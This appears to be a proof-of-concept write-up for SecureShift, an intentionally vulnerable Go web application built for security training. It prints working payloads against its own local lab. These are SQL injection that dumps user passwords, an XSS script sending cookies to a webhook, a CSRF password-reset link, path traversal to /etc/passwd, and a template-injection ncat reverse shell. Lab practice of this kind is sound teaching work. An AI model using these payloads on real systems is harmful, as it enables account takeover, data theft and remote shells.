# SecureShift PoC Report

This project is the intentionally vulnerable web application **“SecureShift”** prepared for educational purposes. Its goal is to provide a hands-on environment to experience common web security vulnerabilities (OWASP Top 10 and similar) as part of security testing practice.

The application is implemented using the **Go language** and an **SQLite database**. It can operate in two different modes: “Secure” and “Insecure”.

---

## Contents

- SQL Injection (Union-based)
- Stored & DOM XSS
- CSRF
- Insecure Deserialization
- SSRF + JWT Bypass + OS Command Injection
- SSTI
- XXE
- IDOR, Path Traversal & Information Disclosure
- File Upload Vulnerabilities

---

# SQL Injection

By repeatedly trying `'` characters, an error-based behavior was observed and the database was identified as **SQLite**.

![1.png](https://raw.githubusercontent.com/ozcanpng/SecureShift/refs/heads/main/SecureShift-PoC-EN/photos/1.png)

```sql
'
```

![2.png](https://raw.githubusercontent.com/ozcanpng/SecureShift/refs/heads/main/SecureShift-PoC-EN/photos/2.png)

```sql
' UNION SELECT 1, name, 3, 4, 5 FROM sqlite_master--
```

![3.png](https://raw.githubusercontent.com/ozcanpng/SecureShift/refs/heads/main/SecureShift-PoC-EN/photos/3.png)

```sql
' UNION SELECT 1, name, 3, 4, 5 FROM sqlite_master WHERE type='table'--
```

![4.png](https://raw.githubusercontent.com/ozcanpng/SecureShift/refs/heads/main/SecureShift-PoC-EN/photos/4.png)

```sql
' UNION SELECT 1, sql, 3, 4, 5 FROM sqlite_master WHERE name='users'--
```

![5.png](https://raw.githubusercontent.com/ozcanpng/SecureShift/refs/heads/main/SecureShift-PoC-EN/photos/5.png)

```sql
' UNION SELECT 1, name||': '||type, 3, 4, 5 FROM pragma_table_info('users')--
```

![6.png](https://raw.githubusercontent.com/ozcanpng/SecureShift/refs/heads/main/SecureShift-PoC-EN/photos/6.png)

```sql
' UNION SELECT 1, username, password, email, 5 FROM users--
```

---

# Stored & DOM XSS

## Stored XSS

A payload submitted to the comments section was persisted by the application and rendered to all users.

PoC payload (cookie exfiltration via webhook):

```html
<script>new Image().src="https://webhook.site/80c6d65e-4b78-4678-9217-7f3e1efca2ee?c="+document.cookie;</script>
```

![7.png](https://raw.githubusercontent.com/ozcanpng/SecureShift/refs/heads/main/SecureShift-PoC-EN/photos/7.png)  
![8.png](https://raw.githubusercontent.com/ozcanpng/SecureShift/refs/heads/main/SecureShift-PoC-EN/photos/8.png)

## DOM XSS

A payload was executed in URL fragments or other DOM-interactive areas:

```
http://localhost:3000/product-detail.html?id=3#<svg/onload=alert('DOMXSS')>
```

![9.png](https://raw.githubusercontent.com/ozcanpng/SecureShift/refs/heads/main/SecureShift-PoC-EN/photos/9.png)  
![10.png](https://raw.githubusercontent.com/ozcanpng/SecureShift/refs/heads/main/SecureShift-PoC-EN/photos/10.png)

---

# CSRF

The `/api/password-reset` endpoint was left open to operate via GET in insecure mode; this enabled CSRF PoC attempts.

PoC example (GET):

```
http://localhost:3000/api/password-reset?password=hackedByPng
```

The response and its effect after the request were visualized.

![11.png](https://raw.githubusercontent.com/ozcanpng/SecureShift/refs/heads/main/SecureShift-PoC-EN/photos/11.png)  
![12.png](https://raw.githubusercontent.com/ozcanpng/SecureShift/refs/heads/main/SecureShift-PoC-EN/photos/12.png)  
![13.png](https://raw.githubusercontent.com/ozcanpng/SecureShift/refs/heads/main/SecureShift-PoC-EN/photos/13.png)  
![14.png](https://raw.githubusercontent.com/ozcanpng/SecureShift/refs/heads/main/SecureShift-PoC-EN/photos/14.png)  
![15.png](https://raw.githubusercontent.com/ozcanpng/SecureShift/refs/heads/main/SecureShift-PoC-EN/photos/15.png)

Note: This PoC can be automated via a page such as `evil.html`.

---

# Insecure Deserialization

During a profile update request (e.g., JSON/form data), the `role` field was tampered with. The manipulated deserialized data was applied on the backend, resulting in a persistent privilege escalation (role: admin).

![16.png](https://raw.githubusercontent.com/ozcanpng/SecureShift/refs/heads/main/SecureShift-PoC-EN/photos/16.png)  
![17.png](https://raw.githubusercontent.com/ozcanpng/SecureShift/refs/heads/main/SecureShift-PoC-EN/photos/17.png)  
![18.png](https://raw.githubusercontent.com/ozcanpng/SecureShift/refs/heads/main/SecureShift-PoC-EN/photos/18.png)  
![19.png](https://raw.githubusercontent.com/ozcanpng/SecureShift/refs/heads/main/SecureShift-PoC-EN/photos/19.png)  
![20.png](https://raw.githubusercontent.com/ozcanpng/SecureShift/refs/heads/main/SecureShift-PoC-EN/photos/20.png)

---

# SSRF + JWT Bypass + OS Command Injection

- The `AvatarFromURL` / URL-based upload point was identified as usable for SSRF.
- JWT verification was bypassed using an `alg: "none"` vulnerability, which allowed skipping signature verification.
- While performing SSRF calls to `/admin/ping`, OS Command Injection vectors were leveraged to execute commands from the admin panel.

![21.png](https://raw.githubusercontent.com/ozcanpng/SecureShift/refs/heads/main/SecureShift-PoC-EN/photos/21.png)  
![22.png](https://raw.githubusercontent.com/ozcanpng/SecureShift/refs/heads/main/SecureShift-PoC-EN/photos/22.png)  
![23.png](https://raw.githubusercontent.com/ozcanpng/SecureShift/refs/heads/main/SecureShift-PoC-EN/photos/23.png)  
![24.png](https://raw.githubusercontent.com/ozcanpng/SecureShift/refs/heads/main/SecureShift-PoC-EN/photos/24.png)  
![25.png](https://raw.githubusercontent.com/ozcanpng/SecureShift/refs/heads/main/SecureShift-PoC-EN/photos/25.png)  
![26.png](https://raw.githubusercontent.com/ozcanpng/SecureShift/refs/heads/main/SecureShift-PoC-EN/photos/26.png)  
![27.png](https://raw.githubusercontent.com/ozcanpng/SecureShift/refs/heads/main/SecureShift-PoC-EN/photos/27.png)  
![28.png](https://raw.githubusercontent.com/ozcanpng/SecureShift/refs/heads/main/SecureShift-PoC-EN/photos/28.png)

This chained PoC begins with JWT bypass, accesses internal resources via SSRF, and then achieves a shell through OS Command Injection.

---

# SSTI

By providing input directly to the template engine, server-side code execution was achieved. Example payloads:

```js
{{Now}}
{{Env "HOME"}}
{{Run "ncat 172.20.10.3 5555 -e zsh"}}
```

![29.png](https://raw.githubusercontent.com/ozcanpng/SecureShift/refs/heads/main/SecureShift-PoC-EN/photos/29.png)  
![30.png](https://raw.githubusercontent.com/ozcanpng/SecureShift/refs/heads/main/SecureShift-PoC-EN/photos/30.png)  
![31.png](https://raw.githubusercontent.com/ozcanpng/SecureShift/refs/heads/main/SecureShift-PoC-EN/photos/31.png)  
![32.png](https://raw.githubusercontent.com/ozcanpng/SecureShift/refs/heads/main/SecureShift-PoC-EN/photos/32.png)

---

# XXE

The XML processing point allowed external entity inclusion, and with a sample PoC the server filesystem was read.

![33.png](https://raw.githubusercontent.com/ozcanpng/SecureShift/refs/heads/main/SecureShift-PoC-EN/photos/33.png)  
![34.png](https://raw.githubusercontent.com/ozcanpng/SecureShift/refs/heads/main/SecureShift-PoC-EN/photos/34.png)  
![35.png](https://raw.githubusercontent.com/ozcanpng/SecureShift/refs/heads/main/SecureShift-PoC-EN/photos/35.png)

---

# IDOR, Path Traversal & Information Disclosure

- Invoices opened from `invoices.html` are fetched via `http://localhost:3000/downloadFile?invoiceID=`.
- In insecure mode, the `invoiceID` parameter was not validated as a numeric type; this allowed unauthorized access to other users' invoices (IDOR).

Examples:

- Elliot's invoice: `invoiceID=2`.  
    ![36.png](https://raw.githubusercontent.com/ozcanpng/SecureShift/refs/heads/main/SecureShift-PoC-EN/photos/36.png)

- Tyrell Wellick's invoice was accessed with `invoiceID=1`.  
    ![37.png](https://raw.githubusercontent.com/ozcanpng/SecureShift/refs/heads/main/SecureShift-PoC-EN/photos/37.png)

- Accessing system files via Path Traversal:

```
http://localhost:3000/downloadFile?invoiceID=../../../../../../../../../etc/passwd
```

![38.png](https://raw.githubusercontent.com/ozcanpng/SecureShift/refs/heads/main/SecureShift-PoC-EN/photos/38.png)

- This permitted reading sensitive system information and led to information disclosure.

---

# File Upload Vulnerabilities

- Profile picture uploads are accepted via `profile.html`.
- **Secure mode**: only `.jpg`, `.jpeg`, and `.png` extensions and MIME type checks are enforced.
- **Insecure mode**: no validation is performed; all extensions are accepted — this allows uploading malicious files and/or RCE (e.g., a php file).

![39.png](https://raw.githubusercontent.com/ozcanpng/SecureShift/refs/heads/main/SecureShift-PoC-EN/photos/39.png)  
![40.png](https://raw.githubusercontent.com/ozcanpng/SecureShift/refs/heads/main/SecureShift-PoC-EN/photos/40.png)
